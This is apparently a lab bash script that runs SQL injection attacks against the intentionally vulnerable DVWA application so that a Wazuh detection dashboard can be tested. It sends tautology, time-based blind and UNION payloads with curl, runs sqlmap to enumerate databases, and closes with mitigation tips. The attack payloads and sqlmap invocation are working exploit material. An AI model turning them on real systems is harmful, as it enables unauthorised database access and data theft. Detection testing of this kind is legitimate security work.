#!/bin/bash

##############################################################################
# DVWA SQL Injection Attack Script
# Educational purpose only - demonstrates automated SQLi detection
##############################################################################

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Target configuration
TARGET_HOST="${1:-dvwa}"
TARGET_URL="http://${TARGET_HOST}/vulnerabilities/sqli/"
DVWA_SECURITY_LEVEL="low"  # low, medium, high, impossible

echo -e "${GREEN}======================================${NC}"
echo -e "${GREEN}  DVWA SQL Injection Attack Script${NC}"
echo -e "${GREEN}======================================${NC}"
echo ""
echo -e "${YELLOW}WARNING: Educational purposes only!${NC}"
echo -e "${YELLOW}Target: ${TARGET_URL}${NC}"
echo ""

# Check if required tools are installed
check_tool() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}Error: $1 is not installed${NC}"
        echo "Installing $1..."
        apt-get update -qq && apt-get install -y $1 >/dev/null 2>&1
    fi
}

echo "[*] Checking required tools..."
check_tool curl
check_tool sqlmap

# Step 1: Basic SQL injection test (manual)
echo ""
echo "[*] Step 1: Testing basic SQL injection..."
echo "[*] Payload: 1' OR '1'='1"

# Test payload
PAYLOAD="1' OR '1'='1"
RESULT=$(curl -s -X GET "${TARGET_URL}?id=${PAYLOAD}&Submit=Submit")

if echo "$RESULT" | grep -q "Surname"; then
    echo -e "${GREEN}[✓] Basic SQLi appears successful - multiple results returned${NC}"
else
    echo -e "${RED}[✗] Basic SQLi test inconclusive${NC}"
fi

# Step 2: Time-based blind SQL injection
echo ""
echo "[*] Step 2: Testing time-based blind SQL injection..."
echo "[*] Payload: 1' AND SLEEP(3)--"

START_TIME=$(date +%s)
PAYLOAD="1' AND SLEEP(3)-- "
curl -s -X GET "${TARGET_URL}?id=${PAYLOAD}&Submit=Submit" >/dev/null
END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))

if [ $ELAPSED -ge 3 ]; then
    echo -e "${GREEN}[✓] Time-based SQLi successful - Delay: ${ELAPSED}s${NC}"
else
    echo -e "${YELLOW}[~] Time-based SQLi inconclusive - Delay: ${ELAPSED}s${NC}"
fi

# Step 3: Enumerate database with UNION attacks
echo ""
echo "[*] Step 3: Testing UNION-based SQL injection..."
echo "[*] Payload: 1' UNION SELECT NULL, version()--"

PAYLOAD="1' UNION SELECT NULL, version()-- "
RESULT=$(curl -s -X GET "${TARGET_URL}?id=${PAYLOAD}&Submit=Submit")

if echo "$RESULT" | grep -q "First name"; then
    echo -e "${GREEN}[✓] UNION-based SQLi successful${NC}"
    VERSION=$(echo "$RESULT" | grep -oP '\d+\.\d+\.\d+' | head -1)
    echo "[*] Detected MySQL version: $VERSION"
else
    echo -e "${YELLOW}[~] UNION-based SQLi needs adjustment${NC}"
fi

# Step 4: SQLMap automated testing (optional)
echo ""
echo "[*] Step 4: Running automated SQLMap scan (this may take a few minutes)..."
echo "[*] This demonstrates comprehensive SQL injection testing"

# Create a simple cookie file for DVWA session
COOKIE="security=${DVWA_SECURITY_LEVEL}; PHPSESSID=test123"

sqlmap -u "${TARGET_URL}?id=1&Submit=Submit" \
    --cookie="${COOKIE}" \
    --batch \
    --level=1 \
    --risk=1 \
    --threads=4 \
    --technique=BEUST \
    --dbs \
    --no-logging 2>&1 | tee /tmp/sqlmap-output.txt

# Parse SQLMap results
if grep -q "available databases" /tmp/sqlmap-output.txt; then
    echo ""
    echo -e "${GREEN}[✓] SQLMap successfully enumerated databases!${NC}"
    grep "available databases" -A 10 /tmp/sqlmap-output.txt
else
    echo -e "${YELLOW}[~] SQLMap scan completed - check output for details${NC}"
fi

# Summary
echo ""
echo -e "${GREEN}======================================${NC}"
echo -e "${GREEN}  Attack Summary${NC}"
echo -e "${GREEN}======================================${NC}"
echo "Target: ${TARGET_URL}"
echo "Security Level: ${DVWA_SECURITY_LEVEL}"
echo ""
echo "Check Wazuh Dashboard (http://localhost:5601) to see if attacks were detected!"
echo ""
echo -e "${YELLOW}Mitigation Tips:${NC}"
echo "  1. Use parameterized queries/prepared statements"
echo "  2. Implement input validation and sanitization"
echo "  3. Apply principle of least privilege to database accounts"
echo "  4. Use Web Application Firewalls (WAF)"
echo "  5. Keep database and application software updated"
echo ""
